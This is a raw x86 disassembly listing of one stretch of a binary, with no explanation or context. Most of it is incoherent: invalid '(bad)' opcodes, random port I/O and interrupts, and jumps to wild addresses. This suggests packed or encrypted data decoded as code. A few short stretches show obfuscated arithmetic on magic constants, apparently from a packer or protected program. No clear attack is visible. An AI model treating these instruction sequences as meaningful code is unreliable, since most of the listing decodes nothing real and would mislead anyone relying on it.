  409080:	jmp    0x4093b4
  409085:	jl     0x409089
  409087:	cli    
  409088:	cmp    esi,DWORD PTR [ebx+eax*2-0x39ebc243]
  40908f:	inc    edi
  409090:	add    eax,0xfb8f0e3f
  409095:	inc    edi
  409096:	jo     0x409053
  409098:	mov    ebx,0xbbbbc5e5
  40909d:	add    esp,DWORD PTR [edi+edx*1]
  4090a0:	or     BYTE PTR [esi+0x3a],cl
  4090a3:	mov    edx,0x4f007f5
  4090a8:	cwde   
  4090a9:	dec    esi
  4090aa:	adc    al,0xef
  4090ac:	xor    esi,DWORD PTR [edx-0x54]
  4090af:	xor    BYTE PTR [ebp-0x4688a128],dl
  4090b5:	adc    al,0xaa
  4090b7:	mov    eax,ds:0x6403408d
  4090bc:	xchg   ebp,eax
  4090bd:	sub    dh,BYTE PTR [esi]
  4090bf:	jmp    0x20668540
  4090c4:	js     0x4090aa
  4090c6:	or     cl,dh
  4090c8:	jl     0x409086
  4090ca:	(bad)  [ecx-0x260941fe]
  4090d0:	adc    ebp,ebx
  4090d2:	leave  
  4090d3:	fbstp  TBYTE PTR [ebx+edx*2+0x518ba174]
  4090da:	in     al,dx
  4090db:	ins    BYTE PTR es:[edi],dx
  4090dc:	out    0x99,al
  4090de:	ins    BYTE PTR es:[edi],dx
  4090df:	call   0xa906ccf8
  4090e4:	sbb    eax,0x3be19df8
  4090e9:	loopne 0x409143
  4090eb:	cmp    DWORD PTR [edi-0x1487e08e],0xfffffff2
  4090f2:	into   
  4090f3:	in     eax,0xd2
  4090f5:	test   DWORD PTR [ebp+0x7e],0x1fe4be1c
  4090fc:	and    bh,bl
  4090fe:	loop   0x409171
  409100:	and    eax,0xf6aff55
  409105:	adc    eax,0x55736932
  40910a:	mov    esp,0xff4023c7
  40910f:	dec    edi
  409110:	lahf   
  409111:	aad    0x9b
  409113:	push   ds
  409114:	mov    al,BYTE PTR [ecx]
  409116:	mov    ds:0xaa8ec861,al
  40911b:	addr16 pop eax
  40911d:	adc    esi,0x57
  409120:	popa   
  409121:	mov    ds:0xe34104ec,eax
  409126:	int    0x4c
  409128:	adc    DWORD PTR [ecx-0x3e58847e],0x449e402d
  409132:	sbb    BYTE PTR [ebp+edi*4-0x5c],ah
  409136:	adc    bh,BYTE PTR [esi+eiz*4]
  409139:	repnz sub DWORD PTR [ebx],edx
  40913c:	fist   DWORD PTR [edx+eax*8+0x4a]
  409141:	imul   al
  409143:	push   0xcd6a490e
  409148:	dec    eax
  409149:	jl     0x4090cf
  40914b:	adc    eax,0xc92cef48
  409150:	mov    ebp,0x1ea71551
  409155:	in     eax,0xa
  409157:	mov    DWORD PTR [ebp+0x5f],esp
  40915a:	inc    edi
  40915b:	or     DWORD PTR [ebx+edx*4-0x7c],edx
  40915f:	push   esi
  409160:	pop    esi
  409161:	leave  
  409162:	bound  ebx,QWORD PTR [edi+eax*4]
  409165:	dec    ecx
  409166:	adc    ch,BYTE PTR [eax]
  409168:	ss dec edx
  40916a:	rol    DWORD PTR [esi-0x5f82c621],1
  409170:	daa    
  409171:	ins    BYTE PTR es:[edi],dx
  409172:	push   es
  409173:	fnstenv [edi+0x14]
  409176:	ret    0x14c0
  409179:	fs jecxz 0x4091bd
  40917c:	nop
  40917d:	cmp    eax,edi
  40917f:	jle    0x4091f3
  409181:	into   
  409182:	jmp    0x1493:0xcfb6ef38
  409189:	lds    esp,FWORD PTR [edi]
  40918b:	std    
  40918c:	pop    eax
  40918d:	and    edx,0xf9f140f5
  409193:	cmp    BYTE PTR [edx-0x45],dl
  409196:	xlat   BYTE PTR ds:[ebx]
  409197:	inc    esp
  409198:	stc    
  409199:	(bad)  
  40919a:	(bad)  
  40919b:	jne    0x409148
  40919d:	repnz pop es
  40919f:	ds dec esi
  4091a1:	xchg   BYTE PTR [edx],dl
  4091a3:	out    0x3a,eax
  4091a5:	repnz sbb al,0xf9
  4091a8:	fistp  DWORD PTR [ecx]
  4091aa:	and    eax,0xf37a2fb2
  4091af:	in     eax,dx
  4091b0:	jbe    0x4091c8
  4091b2:	dec    ebx
  4091b3:	and    eax,0x9db29992
  4091b8:	mov    edx,0xb3627f38
  4091bd:	mov    esi,0x4235af82
  4091c2:	aam    0xc7
  4091c4:	int    0x7d
  4091c6:	outs   dx,BYTE PTR ds:[esi]
  4091c7:	sub    al,0xe0
  4091c9:	(bad)
  4091cc:	call   0xb9e9:0xef843f07
  4091d3:	mov    ah,dh
  4091d5:	pop    ds
  4091d6:	stos   BYTE PTR es:[edi],al
  4091d7:	es int 0x2a
  4091da:	outs   dx,BYTE PTR ds:[esi]
  4091db:	push   0x59
  4091dd:	adc    DWORD PTR [ecx],esi
  4091df:	in     al,0x8a
  4091e1:	and    DWORD PTR [esi-0x19],ebp
  4091e4:	shr    eax,1
  4091e6:	popa   
  4091e7:	lods   eax,DWORD PTR ds:[esi]
  4091e8:	or     BYTE PTR [ecx+0x3377f7fb],0xb1
  4091ef:	scas   eax,DWORD PTR es:[edi]
  4091f0:	mov    al,dh
  4091f2:	mov    al,ds:0x701a4f6b
  4091f7:	or     al,0x6b
  4091f9:	push   ecx
  4091fa:	mov    ecx,0xc359b986
  4091ff:	in     eax,dx
  409200:	ds loope 0x409282
  409203:	sub    al,0x5c
  409205:	pop    edi
  409206:	mov    ds:0x9e2f082,eax
  40920b:	adc    edi,DWORD PTR [edi-0x31]
  40920e:	inc    ebp
  40920f:	sbb    edi,eax
  409211:	add    DWORD PTR [esi+0x380126a5],eax
  409217:	dec    ebp
  409218:	jl     0x4091c1
  40921a:	fdiv   QWORD PTR [esi+0x1176a20c]
  409220:	jnp    0x409292
  409222:	popa   
  409223:	lock jl 0x40925e
  409226:	ins    DWORD PTR es:[edi],dx
  409227:	and    ah,0x51
  40922a:	push   esp
  40922b:	push   ecx
  40922c:	mov    ebx,0xcdaf6652
  409231:	frstor [esi]
  409233:	or     bl,dh
  409235:	arpl   WORD PTR [edi-0x7],ax
  409238:	xchg   edx,eax
  409239:	std    
  40923a:	add    dl,BYTE PTR [esp+ebx*1+0x48]
  40923e:	or     edx,DWORD PTR [eiz*8-0x3564d3d6]
  409245:	sbb    BYTE PTR [edi-0x357a5daa],ah
  40924b:	test   DWORD PTR [edx+ecx*4+0x1015a593],0x94d35f7c
  409256:	retf   
  409257:	mov    edi,0x2846a1c3
  40925c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40925d:	fcom   QWORD PTR [eax-0x13]
  409260:	xchg   ebp,eax
  409261:	out    0x67,al
  409263:	popa   
  409264:	fwait
  409265:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409266:	jl     0x409244
  409268:	call   0xf6752434
  40926d:	nop
  40926e:	jg     0x409285
  409270:	lods   eax,DWORD PTR ds:[esi]
  409271:	mov    ebp,0xf5cd3781
  409276:	or     esi,ecx
  409278:	xchg   ebp,eax
  409279:	inc    ebx
  40927a:	imul   edi,DWORD PTR [ebx-0x1],0xffffffe5
  40927e:	outs   dx,DWORD PTR ds:[esi]
  40927f:	int    0xd7
  409281:	inc    ebp
  409282:	pop    ebp
  409283:	or     edx,esi
  409285:	shr    DWORD PTR [ecx+ebx*1+0x47],1
  409289:	mov    ebx,0x7a340480
  40928e:	fld    QWORD PTR [esi+0x6d]
  409291:	and    ah,ah
  409293:	or     eax,0x73b709bf
  409298:	test   DWORD PTR [esi],edi
  40929a:	(bad)  
  40929b:	mov    al,BYTE PTR [ebx+0x7d]
  40929e:	mov    dl,0xc4
  4092a0:	ficom  WORD PTR [esp+esi*8-0x1e40c224]
  4092a7:	add    ebx,0xffffff9b
  4092aa:	mov    bh,0xc5
  4092ac:	sub    BYTE PTR [edx],0x9
  4092af:	sbb    edx,edi
  4092b1:	and    bh,BYTE PTR [ebp-0x3d]
  4092b4:	icebp  
  4092b5:	jl     0x4092e7
  4092b7:	cli    
  4092b8:	or     ch,BYTE PTR [eax+0x256b5404]
  4092be:	pop    es
  4092bf:	cmp    bh,ch
  4092c1:	mov    ecx,0x63f8d119
  4092c6:	retf   0x4b4e
  4092c9:	fild   WORD PTR [ecx+edx*8+0x40]
  4092cd:	pushf  
  4092ce:	and    edx,DWORD PTR [eax-0x18e93910]
  4092d4:	es or  esp,esi
  4092d7:	in     eax,dx
  4092d8:	int    0xe3
  4092da:	mov    ah,0xaa
  4092dc:	xchg   ecx,eax
  4092dd:	js     0x409330
  4092df:	mov    ebp,DWORD PTR [esi-0x240e4acd]
  4092e5:	pop    eax
  4092e6:	das    
  4092e7:	add    ah,cl
  4092e9:	sbb    dl,bh
  4092eb:	jae    0x40932b
  4092ed:	outs   dx,BYTE PTR ds:[esi]
  4092ee:	aam    0xc2
  4092f0:	sbb    al,0x31
  4092f2:	call   0x1a2c:0xc064c491
  4092f9:	jmp    0x4092dc
  4092fb:	pop    DWORD PTR [edi]
  4092fd:	pop    esi
  4092fe:	hlt    
  4092ff:	xchg   DWORD PTR [ecx+ebp*2-0xe1d73de],ebx
  409306:	mov    ah,0x4f
  409308:	sub    al,0xf0
  40930a:	inc    edi
  40930b:	ret    0x266b
  40930e:	push   0x5f
  409310:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409311:	push   cs
  409312:	add    al,0x2b
  409314:	sub    al,cl
  409316:	out    0x89,al
  409318:	fstp   QWORD PTR [esi-0x5f7ca61c]
  40931e:	push   ds
  40931f:	mov    eax,0x3ac8e073
  409324:	inc    edx
  409325:	lods   al,BYTE PTR ds:[esi]
  409326:	test   al,0xd1
  409328:	jbe    0x409316
  40932a:	arpl   WORD PTR [eax],bp
  40932c:	scas   al,BYTE PTR es:[edi]
  40932d:	repnz push 0x87a5e1ef
  409333:	xor    DWORD PTR [esi+edi*2+0x66],esi
  409337:	lods   al,BYTE PTR ds:[esi]
  409338:	retf   0x94b5
  40933b:	imul   BYTE PTR [edi-0x3a]
  40933e:	outs   dx,DWORD PTR ds:[esi]
  40933f:	dec    ecx
  409340:	pop    ebp
  409341:	stos   BYTE PTR es:[edi],al
  409342:	push   ds
  409343:	aad    0x3d
  409345:	sub    cl,BYTE PTR [eax]
  409347:	aam    0xa5
  409349:	ss pushf 
  40934b:	imul   ebx,DWORD PTR [ebx+edx*8-0x59e2f85d],0x6fbfd566
  409356:	mov    cl,0x19
  409358:	es hlt 
  40935a:	or     esi,DWORD PTR [eax-0x2c637f94]
  409360:	xor    eax,0xb379fb34
  409365:	fsub   st,st(1)
  409367:	aam    0xcf
  409369:	mov    al,ds:0x9d52fb61
  40936e:	and    BYTE PTR [ebx],dh
  409370:	retf   0x43b9
  409373:	fnstsw WORD PTR [edx+ebp*2]
  409376:	loope  0x4093a6
  409378:	in     al,dx
  409379:	fldenv [edx]
  40937b:	ds mov al,0x7b
  40937e:	add    eax,0x81d6e6c6
  409383:	mov    ch,BYTE PTR [esp]
  409386:	outs   dx,DWORD PTR ds:[esi]
  409387:	ret    0xa4a5
  40938a:	sti    
  40938b:	sub    edx,esp
  40938d:	mul    BYTE PTR [esi-0x6ddd0619]
  409393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409394:	jno    0x409319
  409396:	cld    
  409397:	and    dh,dl
  409399:	lahf   
  40939a:	mov    esp,0x7d4bfb7f
  40939f:	mov    ah,ch
  4093a1:	scas   al,BYTE PTR es:[edi]
  4093a2:	push   esi
  4093a3:	adc    eax,0x610d6f7f
  4093a8:	(bad)  
  4093a9:	frstor [edx-0x2fa6493]
  4093af:	push   es
  4093b0:	xlat   BYTE PTR ds:[ebx]
  4093b1:	and    ecx,DWORD PTR [edi-0x71]
  4093b4:	add    eax,0x1b61
  4093b9:	and    eax,edx
  4093bb:	mov    edx,DWORD PTR [ebp-0x8]
  4093be:	xor    eax,0x4f1f
  4093c3:	imul   edx,eax
  4093c6:	mov    eax,0xd18019b
  4093cb:	jmp    0x4096ff
  4093d0:	add    ecx,DWORD PTR [ecx-0x50]
  4093d3:	mov    cl,0xb0
  4093d5:	mov    ecx,0xbbbc7903
  4093da:	(bad)  
  4093db:	das    
  4093dc:	adc    BYTE PTR [ebx+0x45],dh
  4093df:	jno    0x409452
  4093e1:	jb     0x40939e
  4093e3:	mov    ebx,0xbbbbc5e5
  4093e8:	ror    DWORD PTR [ebx+0x16c741d1],1
  4093ee:	inc    ebp
  4093ef:	popa   
  4093f0:	int3   
  4093f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093f2:	aad    0xc4
  4093f4:	xchg   edi,eax
  4093f5:	cmp    BYTE PTR [eax],al
  4093f7:	lods   al,BYTE PTR ds:[esi]
  4093f8:	imul   ebp,DWORD PTR [edx],0x12
  4093fb:	ja     0x409463
  4093fd:	mov    DWORD PTR [ecx+0x398a8429],esi
  409403:	push   0x85997c84
  409408:	dec    esp
  409409:	cmp    DWORD PTR [eax+eiz*4],0x313c8d45
  409410:	xchg   esp,ebx
  409412:	into   
  409413:	sub    dh,al
  409415:	push   ds
  409416:	fisub  DWORD PTR [esi+0x6747e519]
  40941c:	dec    edx
  40941d:	sub    al,0x75
  40941f:	mov    bl,0x8
  409421:	sbb    edx,DWORD PTR [ecx-0x3b0879e8]
  409427:	sar    BYTE PTR [edx-0x8],1
  40942a:	sbb    edi,DWORD PTR [edx+0x34]
  40942d:	xor    DWORD PTR [esi+0x42],ebp
  409430:	daa    
  409431:	inc    ebx
  409432:	pop    edx
  409433:	int3   
  409434:	fcomp  DWORD PTR [edi+0x7c7f8bc5]
  40943a:	or     eax,0xa5549d23
  40943f:	sub    al,0x98
  409441:	test   BYTE PTR gs:[esi],bh
  409444:	sub    BYTE PTR [ecx],bh
  409446:	pop    es
  409447:	ja     0x4093e8
  409449:	sahf   
  40944a:	jecxz  0x409421
  40944c:	jbe    0x40945d
  40944e:	and    BYTE PTR [eax+ebp*1-0x58e617e7],0xcd
  409456:	jmp    0xf0522b4e
  40945b:	fisttp QWORD PTR [edx+0x3c]
  40945e:	test   eax,0x16a2c56f
  409463:	ret    0xc7d8
  409466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409467:	clc    
  409468:	dec    edi
  409469:	adc    eax,0x2749b0b7
  40946e:	pop    esp
  40946f:	sub    al,0xe0
  409471:	inc    ebp
  409472:	xchg   esi,eax
  409473:	pushf  
  409474:	ss jbe 0x409409
  409477:	adc    BYTE PTR [eax+0x37],al
  40947a:	or     al,0xc7
  40947c:	(bad)
  40947f:	xchg   ebx,eax
  409480:	inc    ecx
  409481:	jle    0x40947a
  409483:	push   ebx
  409484:	push   edi
  409485:	(bad)  
  409486:	out    dx,al
  409487:	hlt    
  409488:	pop    ecx
  409489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40948a:	call   0xf902bd62
  40948f:	aam    0x69
  409491:	movntps XMMWORD PTR [ebp+0x70],xmm4
  409495:	fadd   DWORD PTR [edi-0x64]
  409498:	enter  0x7039,0x55
  40949c:	mov    edi,0xdc43ccca
  4094a1:	mul    DWORD PTR [eax]
  4094a3:	popa   
  4094a4:	fadd   QWORD PTR [eax-0x35]
  4094a7:	mov    ebp,0x1e8d82
  4094ac:	mov    ds:0xd0ceeec4,eax
  4094b1:	adc    eax,0x769bdf5b
  4094b6:	(bad)  
  4094b7:	cmc    
  4094b8:	loop   0x40947b
  4094ba:	test   al,0x2f
  4094bc:	pop    edx
  4094bd:	mov    ebp,0x5e925374
  4094c2:	mov    dh,0xd5
  4094c4:	pop    edx
  4094c5:	sub    DWORD PTR [ebx+eiz*8-0x5f],ebp
  4094c9:	out    0x23,al
  4094cb:	mov    ebx,0x516fa463
  4094d0:	xor    al,0xbc
  4094d2:	stos   BYTE PTR es:[edi],al
  4094d3:	aaa    
  4094d4:	xor    eax,0x982bbe7a
  4094d9:	push   ebx
  4094da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094db:	sub    DWORD PTR [ebp+ebp*4-0x7bd7dcfc],edi
  4094e2:	dec    ecx
  4094e3:	dec    esp
  4094e4:	mov    eax,0x82a5c5f2
  4094e9:	cwde   
  4094ea:	mov    bh,0x9b
  4094ec:	(bad)  
  4094ed:	fldenv [esp+ebx*8+0x62]
  4094f1:	(bad)  
  4094f3:	fwait
  4094f4:	jp     0x409565
  4094f6:	add    esi,DWORD PTR ds:0x5169b87a
  4094fc:	arpl   ax,ax
  4094fe:	pop    eax
  4094ff:	fidiv  WORD PTR [ebx]
  409501:	stc    
  409502:	stos   DWORD PTR es:[edi],eax
  409503:	add    ah,bh
  409505:	inc    ebx
  409506:	ficomp DWORD PTR [edx-0x34]
  409509:	loope  0x4094a8
  40950b:	(bad)  
  40950c:	pop    eax
  40950d:	mov    bh,0x52
  40950f:	and    ch,BYTE PTR [ecx-0x10b26021]
  409515:	mov    ebp,0xff698a3b
  40951a:	sub    eax,0xe12722f2
  40951f:	call   0xb9e4c21
  409524:	scas   al,BYTE PTR es:[edi]
  409525:	aas    
  409526:	sub    dh,dl
  409528:	or     DWORD PTR [edi+edi*4-0x34],edx
  40952c:	ins    BYTE PTR es:[edi],dx
  40952d:	icebp  
  40952e:	imul   ebx,edx,0xbd56cd82
  409534:	pop    ebx
  409535:	ds sahf 
  409537:	push   ebp
  409538:	int    0x4d
  40953a:	pop    es
  40953b:	dec    esp
  40953c:	aam    0xbf
  40953e:	int    0xe4
  409540:	icebp  
  409541:	mov    ebx,0x97a87564
  409546:	or     ah,BYTE PTR [esi+0x7c]
  409549:	mov    ebx,0x10f8fe5b
  40954e:	rol    BYTE PTR cs:[esi+edx*8+0x10],1
  409553:	rcl    ch,0xf4
  409556:	icebp  
  409557:	out    0xd5,al
  409559:	sub    edx,edi
  40955b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40955c:	ss jns 0x409538
  40955f:	iret   
  409560:	cmp    eax,0xce910fb4
  409565:	jmp    0x409569
  409567:	ror    BYTE PTR [ebx],0x49
  40956a:	fwait
  40956b:	cmc    
  40956c:	aad    0x61
  40956e:	sbb    DWORD PTR [eax-0x293df361],esp
  409574:	xchg   edx,eax
  409575:	js     0x4095cb
  409577:	rcl    DWORD PTR [edx-0x2f],0xab
  40957b:	icebp  
  40957c:	fiadd  DWORD PTR [edx-0x50]
  40957f:	repnz leave 
  409581:	not    BYTE PTR [ebp+0x766c3347]
  409587:	loop   0x4095e0
  409589:	pop    DWORD PTR [eax]
  40958b:	adc    al,0xca
  40958d:	and    edi,ebx
  40958f:	mov    WORD PTR [ebx+0x54d126b],fs
  409595:	jl     0x4095b3
  409597:	add    cl,al
  409599:	push   0x3ca327
  40959e:	sti    
  40959f:	test   BYTE PTR [ebx-0x7f],bh
  4095a2:	sar    BYTE PTR [edx-0x62b16180],cl
  4095a8:	pop    ds
  4095a9:	stos   BYTE PTR es:[edi],al
  4095aa:	aas    
  4095ab:	or     esp,edx
  4095ad:	and    bl,dh
  4095af:	cs adc eax,0xb94400e5
  4095b5:	inc    edi
  4095b6:	ins    BYTE PTR es:[edi],dx
  4095b7:	popa   
  4095b8:	sub    al,0xa5
  4095ba:	(bad)  
  4095bb:	cmp    DWORD PTR [edi],ecx
  4095bd:	popf   
  4095be:	xchg   DWORD PTR [eax+0x6f],eax
  4095c1:	dec    ebp
  4095c2:	out    0x49,al
  4095c4:	leave  
  4095c5:	fs popa 
  4095c7:	push   edi
  4095c8:	cli    
  4095c9:	(bad)  
  4095ca:	ins    DWORD PTR es:[edi],dx
  4095cb:	push   ecx
  4095cc:	push   edi
  4095cd:	retf   
  4095ce:	sub    edx,edx
  4095d0:	aaa    
  4095d1:	adc    DWORD PTR [ebx-0x39],edi
  4095d4:	loop   0x409626
  4095d6:	adc    DWORD PTR [eax-0x46],0xffffffe3
  4095da:	sub    al,0xde
  4095dc:	add    DWORD PTR [ebx+0x5],0xfffffffa
  4095e0:	mov    bh,0xd
  4095e2:	xlat   BYTE PTR ds:[ebx]
  4095e3:	jmp    0x50edcd1c
  4095e8:	sbb    BYTE PTR [edx+0x588eade],bh
  4095ee:	cmp    DWORD PTR [eax],0x6511c2c9
  4095f4:	mov    BYTE PTR ds:0xbb12,dl
  4095f9:	lock jns 0x4095ae
  4095fc:	dec    ebp
  4095fd:	repnz dec edx
  4095ff:	pop    ds
  409600:	std    
  409601:	push   ecx
  409602:	inc    esi
  409603:	int3   
  409604:	in     al,0x91
  409606:	jb     0x40963e
  409608:	inc    eax
  409609:	jmp    0x4095b7
  40960b:	jmp    0x40960f
  40960d:	stos   DWORD PTR es:[di],eax
  40960f:	or     BYTE PTR [esi],ch
  409611:	repnz push es
  409613:	popf   
  409614:	mov    bh,0xbe
  409616:	sub    al,0x87
  409618:	shl    BYTE PTR [edi],cl
  40961a:	and    BYTE PTR [ecx-0x5c],dh
  40961d:	xchg   esp,eax
  40961e:	aam    0x16
  409620:	mov    edx,0x7d8ffff2
  409625:	sbb    eax,0x5cf49d2b
  40962a:	push   edi
  40962b:	mov    eax,0x1329a082
  409630:	pushf  
  409631:	sbb    DWORD PTR [edi+0x3162bae7],0xffffff82
  409638:	fisub  DWORD PTR [esi-0x22]
  40963b:	mov    WORD PTR [eax-0x58329456],cs
  409641:	arpl   WORD PTR [edi],sp
  409643:	out    0xf7,al
  409645:	bt     edi,ebx
  409648:	jns    0x40961e
  40964a:	gs repz sub eax,0xf8507601
  409651:	xor    al,0xb0
  409653:	xchg   ecx,eax
  409654:	and    al,BYTE PTR [esi+edx*8-0x2f]
  409658:	imul   DWORD PTR [edi]
  40965a:	fimul  WORD PTR [edi+0x54b86be1]
  409660:	aam    0xe5
  409662:	pop    edi
  409663:	retf   
  409664:	xchg   ebp,eax
  409665:	add    edx,eax
  409667:	fs int3 
  409669:	xchg   edx,eax
  40966a:	or     DWORD PTR [edx+eiz*2],esp
  40966d:	sub    edx,eax
  40966f:	xchg   esp,eax
  409670:	xchg   DWORD PTR [edx],edx
  409672:	inc    ecx
  409673:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409674:	inc    ebp
  409675:	mov    al,0x47
  409677:	test   al,0x8b
  409679:	addr16 jmp 0x324b3697
  40967f:	clc    
  409680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409681:	xchg   esi,eax
  409682:	or     ecx,eax
  409684:	cmp    BYTE PTR [edi],al
  409686:	loopne 0x409631
  409688:	xchg   esi,eax
  409689:	or     DWORD PTR [ecx+0x66],0xffffffe7
  40968d:	out    dx,al
  40968e:	mov    ebx,0xb3c77c24
  409693:	sbb    bl,BYTE PTR [eax]
  409695:	push   edx
  409696:	div    BYTE PTR [ecx-0x4794bc15]
  40969c:	mov    ah,ch
  40969e:	adc    DWORD PTR [esi-0x19e9a838],esi
  4096a4:	cli    
  4096a5:	xor    esi,ecx
  4096a7:	fbld   TBYTE PTR [ecx+0x4674c62c]
  4096ad:	retf   
  4096ae:	std    
  4096af:	out    0x2,eax
  4096b1:	fnstcw WORD PTR [ebx+eax*4+0x5f]
  4096b5:	dec    eax
  4096b6:	xchg   esi,eax
  4096b7:	xchg   edx,eax
  4096b8:	aas    
  4096b9:	rcl    DWORD PTR [ebx-0xf],0x3
  4096bd:	push   edx
  4096be:	dec    edx
  4096bf:	ins    BYTE PTR es:[edi],dx
  4096c0:	jmp    0x100d94a4
  4096c5:	cwde   
  4096c6:	pop    esp
  4096c7:	nop
  4096c8:	mov    eax,ds:0x975aecb5
  4096cd:	add    BYTE PTR [edi],ah
  4096cf:	xchg   edx,eax
  4096d0:	mov    cl,BYTE PTR [eax]
  4096d2:	aad    0x44
  4096d4:	sbb    eax,ebx
  4096d6:	and    esp,DWORD PTR [edx+0x29440ae]
  4096dc:	pop    esp
  4096dd:	pushf  
  4096de:	(bad)  
  4096df:	out    dx,eax
  4096e0:	dec    ecx
  4096e1:	mov    ?,WORD PTR [edi+0x157f226e]
  4096e7:	mov    cl,0x84
  4096e9:	jnp    0x4096af
  4096eb:	mov    edx,0xc0bcd82c
  4096f0:	xor    esi,ebx
  4096f2:	or     ebx,edi
  4096f4:	dec    esp
  4096f5:	jbe    0x409711
  4096f7:	pop    ds
  4096f8:	rol    BYTE PTR [ebp+esi*2+0x4711ef7d],1
  4096ff:	sub    eax,edx
  409701:	add    ecx,eax
  409703:	mov    eax,DWORD PTR [ebp+0x8]
  409706:	mov    edi,DWORD PTR ds:0x4226b4
  40970c:	add    eax,0x20ae
  409711:	and    eax,0x55aa
  409716:	xor    edx,edx
  409718:	div    edi
  40971a:	xor    eax,0x4c2d
  40971f:	or     eax,0x23d2
  409724:	xor    eax,esi
  409726:	cmp    ecx,eax
  409728:	jb     0x408cc1
  40972e:	pop    ebx
  40972f:	mov    DWORD PTR [ebp+0x8],0x789e
  409736:	jmp    0x409a6a
  40973b:	and    al,0x12
  40973d:	sub    BYTE PTR [edx],0xbc
  409740:	mov    eax,0xd3621cb4
  409745:	enter  0x792f,0xee
  409749:	ret    0x932f
  40974c:	jl     0x409709
  40974e:	mov    ebx,0xbbbbc5e5
  409753:	imul   esp,DWORD PTR [ebp-0x541ad19],0x6f
  40975a:	lahf   
  40975b:	sbb    DWORD PTR [esi+0xb],ebp
  40975e:	loop   0x4096f0
  409760:	push   eax
  409761:	pop    ds
  409762:	push   esi
  409763:	jmp    0x8882e2af
  409768:	xor    DWORD PTR [esi-0x25],ebx
  40976b:	or     al,0x44
  40976d:	and    BYTE PTR [ebx-0x4eab0c48],al
  409773:	dec    ebx
  409774:	aaa    
  409775:	xor    BYTE PTR [edi],ah
  409777:	imul   esi,DWORD PTR [edi-0x2cc0df],0x14c01628
  409781:	jne    0x40978d
  409783:	push   ecx
  409784:	jne    0x40972f
  409786:	(bad)  
  409787:	push   esi
  409788:	(bad)  
  409789:	push   ss
  40978a:	das    
  40978b:	pop    es
  40978c:	and    bh,BYTE PTR [ebp+0x6c]
  40978f:	jmp    0x6671:0x46e0f0d7
  409796:	leave  
  409797:	add    al,0xd6
  409799:	cmp    eax,0x7bec8c47
  40979e:	retf   
  40979f:	mov    ds:0xbe10375a,eax
  4097a4:	imul   ebp,DWORD PTR [ebx-0x93a85a7],0xc3cf4df9
  4097ae:	sbb    esi,DWORD PTR [ebx-0x4859aea]
  4097b4:	je     0x40973a
  4097b6:	push   esi
  4097b7:	jg     0x409767
  4097b9:	sub    al,0x3e
  4097bb:	cmp    eax,0x4d00bd85
  4097c0:	and    BYTE PTR [ebp+0xb68aee2],dh
  4097c6:	leave  
  4097c7:	adc    DWORD PTR [ecx],edi
  4097c9:	dec    esi
  4097ca:	inc    edx
  4097cb:	push   ebp
  4097cc:	lock inc edi
  4097ce:	cmp    DWORD PTR [ebp-0x54],0xffffffc3
  4097d2:	inc    esi
  4097d3:	or     DWORD PTR [ebp+0x27],0xfefb66b9
  4097da:	mov    bh,0xa3
  4097dc:	mov    ebp,0x9de0122f
  4097e1:	imul   DWORD PTR [ebx]
  4097e3:	xor    ebp,eax
  4097e5:	pop    eax
  4097e6:	in     al,dx
  4097e7:	mov    ecx,0x4bf6420d
  4097ec:	add    al,ah
  4097ee:	cmp    esp,DWORD PTR [ebp+0x2d]
  4097f1:	lahf   
  4097f2:	or     eax,0x9b3b29fe
  4097f7:	adc    DWORD PTR [ebx+edx*4],edi
  4097fa:	add    si,WORD PTR [edx]
  4097fd:	mov    eax,0xfca2697e
  409802:	addr16 mov edi,0x153d79a9
  409808:	mov    ds:0x83a9370a,eax
  40980d:	retf   0xbd68
  409810:	push   ebp
  409811:	push   es
  409812:	ins    BYTE PTR es:[edi],dx
  409813:	shr    BYTE PTR [edx+eax*8],0x3a
  409817:	jmp    0x2754eaa1
  40981c:	xor    al,0x2b
  40981e:	sub    al,dl
  409820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409821:	shl    BYTE PTR [edx+0x40],1
  409824:	stc    
  409825:	mov    bh,0xcb
  409827:	nop
  409828:	pop    esi
  409829:	aas    
  40982a:	dec    ebx
  40982b:	push   es
  40982c:	mov    dl,0xc5
  40982e:	sbb    ebx,0x55765d57
  409834:	xchg   edi,eax
  409835:	and    esi,edx
  409837:	add    cl,BYTE PTR [ebx+edi*1]
  40983a:	mov    WORD PTR [edi-0x129784c7],?
  409840:	sub    dl,dl
  409842:	jl     0x409804
  409844:	aam    0xb3
  409846:	fld    st(2)
  409848:	pop    es
  409849:	pop    eax
  40984a:	add    DWORD PTR [ebx-0x1],0x76
  40984e:	push   es
  40984f:	mov    bl,0x8a
  409851:	pop    ds
  409852:	push   0xd64f9fe1
  409857:	dec    eax
  409858:	mov    ebx,0x67f53e36
  40985d:	xor    ah,0xb8
  409860:	rcl    BYTE PTR [ebx],cl
  409862:	dec    ebp
  409863:	pop    esp
  409864:	shl    DWORD PTR [ecx-0x9],1
  409867:	das    
  409868:	xor    BYTE PTR [esi-0x364a1ebe],0x9
  40986f:	or     al,0x28
  409871:	push   ds
  409872:	jae    0x409859
  409874:	neg    ah
  409876:	imul   esp,DWORD PTR [edi],0x79
  409879:	push   edi
  40987a:	ds loopne 0x409884
  40987d:	call   0x9b4a50ca
  409882:	adc    ecx,esi
  409884:	adc    dh,BYTE PTR [esi+0x4d]
  409887:	ss (bad) 
  409889:	sbb    ch,BYTE PTR [ebx]
  40988b:	inc    eax
  40988c:	pop    edx
  40988d:	out    dx,eax
  40988e:	fcom   st(3)
  409890:	shr    DWORD PTR [edx+0x779b3f17],0xb4
  409897:	out    0x14,al
  409899:	imul   DWORD PTR [ebp+edx*4+0x4c88d8c9]
  4098a0:	fst    QWORD PTR [ebx-0x7c]
  4098a3:	mov    edi,0xc9841554
  4098a8:	dec    edi
  4098a9:	stos   DWORD PTR es:[edi],eax
  4098aa:	popa   
  4098ab:	pop    ss
  4098ac:	or     ebx,DWORD PTR [edi-0x3]
  4098af:	clc    
  4098b0:	jmp    0x409869
  4098b2:	push   0x390cf0ec
